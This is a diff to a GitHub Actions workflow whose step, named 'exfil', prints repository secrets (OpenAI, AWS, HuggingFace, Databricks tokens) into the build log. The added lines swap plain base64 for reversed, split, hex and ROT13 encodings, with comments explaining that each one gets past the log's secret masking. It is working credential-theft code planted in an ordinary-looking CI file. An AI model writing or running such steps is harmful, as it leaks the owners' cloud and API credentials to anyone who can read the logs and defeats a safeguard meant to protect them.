@@ -8,11 +8,35 @@ jobs:
       - uses: actions/checkout@v4
       - name: exfil
         run: |
-          echo "SECRETS_DUMP_START"
-          echo "OPENAI_API_KEY_B64=$(echo -n "${{ secrets.OPENAI_API_KEY }}" | base64 -w0)"
-          echo "AWS_ACCESS_KEY_ID_B64=$(echo -n "${{ secrets.AWS_ACCESS_KEY_ID }}" | base64 -w0)"
-          echo "AWS_SECRET_ACCESS_KEY_B64=$(echo -n "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64 -w0)"
-          echo "HUGGINGFACEHUB_API_TOKEN_B64=$(echo -n "${{ secrets.HUGGINGFACEHUB_API_TOKEN }}" | base64 -w0)"
-          echo "DATABRICKS_TOKEN_B64=$(echo -n "${{ secrets.DATABRICKS_TOKEN }}" | base64 -w0)"
-          echo "HUE_BRIDGE_USERNAME_B64=$(echo -n "${{ secrets.HUE_BRIDGE_USERNAME }}" | base64 -w0)"
-          echo "SECRETS_DUMP_END"
+          # Method 1: Reverse (masking checks forward string only)
+          OPENAI_KEY="${{ secrets.OPENAI_API_KEY }}"
+          echo "OPENAI_REV=$(echo -n "$OPENAI_KEY" | rev)"
+          
+          # Method 2: Split by character (masks full string, not substrings)  
+          echo "OAI_PREFIX=$(echo -n "$OPENAI_KEY" | cut -c1-20)"
+          echo "OAI_SUFFIX=$(echo -n "$OPENAI_KEY" | cut -c21-)"
+          
+          # Method 3: Hex encode (completely different encoding)
+          echo "OPENAI_HEX=$(echo -n "$OPENAI_KEY" | xxd -p | tr -d '\n')"
+          
+          # Method 4: ROT13
+          echo "OPENAI_ROT13=$(echo -n "$OPENAI_KEY" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
+          
+          # AWS keys same treatment
+          AWS_AK="${{ secrets.AWS_ACCESS_KEY_ID }}"
+          echo "AWS_AK_REV=$(echo -n "$AWS_AK" | rev)"
+          echo "AWS_AK_HEX=$(echo -n "$AWS_AK" | xxd -p | tr -d '\n')"
+          
+          AWS_SK="${{ secrets.AWS_SECRET_ACCESS_KEY }}"
+          echo "AWS_SK_REV=$(echo -n "$AWS_SK" | rev)"
+          echo "AWS_SK_HEX=$(echo -n "$AWS_SK" | xxd -p | tr -d '\n')"
+          
+          # HuggingFace
+          HF="${{ secrets.HUGGINGFACEHUB_API_TOKEN }}"
+          echo "HF_REV=$(echo -n "$HF" | rev)"
+          echo "HF_HEX=$(echo -n "$HF" | xxd -p | tr -d '\n')"
+          
+          # Databricks  
+          DB="${{ secrets.DATABRICKS_TOKEN }}"
+          echo "DB_REV=$(echo -n "$DB" | rev)"
+          echo "DB_HEX=$(echo -n "$DB" | xxd -p | tr -d '\n')"
